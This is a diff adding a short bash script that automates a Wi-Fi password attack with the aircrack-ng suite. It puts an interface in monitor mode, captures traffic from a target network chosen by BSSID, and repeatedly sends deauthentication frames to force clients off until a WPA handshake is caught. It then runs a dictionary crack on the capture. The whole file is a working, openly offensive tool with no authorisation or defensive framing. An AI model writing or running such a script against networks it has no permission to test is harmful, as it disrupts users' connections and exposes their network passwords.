@@ -1,0 +1,44 @@
+#!/bin/bash
+
+#dependencies
+sudo apt-get install aircrack-ng -y
+sudo apt install net-tools -y
+clear
+
+#select wifi interface
+echo "Wifi Interfaces avalible:"
+ifconfig | grep -o '^[^ :]*' | grep -o '^w.*'
+echo "Enter wifi interface:"
+read wifi_interface
+
+#list all wifi networks
+sudo airmon-ng start $wifi_interface
+sudo airodump-ng ${wifi_interface}mon
+
+#select target information
+echo "Enter bssid of the targeted network"
+read targeted_bssid
+echo "Enter the channel of the targeted network"
+read targeted_channel
+
+#begin attack
+sudo rm handshake-file*
+sudo gnome-terminal --wait -- /bin/bash -c "airodump-ng --bssid $targeted_bssid -c $targeted_channel -w handshake-file ${wifi_interface}mon" &
+sleep 1
+
+handshake="$(aircrack-ng handshake-file-01.cap | grep -o '([01].*)' | grep -o '[01]')"
+while [ "$handshake" != "1" ]; do
+	echo "Not found yet"
+	sudo aireplay-ng --deauth 1 -a $targeted_bssid ${wifi_interface}mon --ignore-negative-one
+	sleep 20
+	handshake="$(aircrack-ng handshake-file-01.cap | grep -o '([01].*)' | grep -o '[01]')"
+done
+echo "Found!!!"
+
+#re-enable wifi interface
+sudo airmon-ng stop ${wifi_interface}mon
+
+#try to decipher the password with a dictionary
+echo "Enter dictionary file name"
+read DIC
+sudo aircrack-ng handshake-file-01.cap -w $DIC
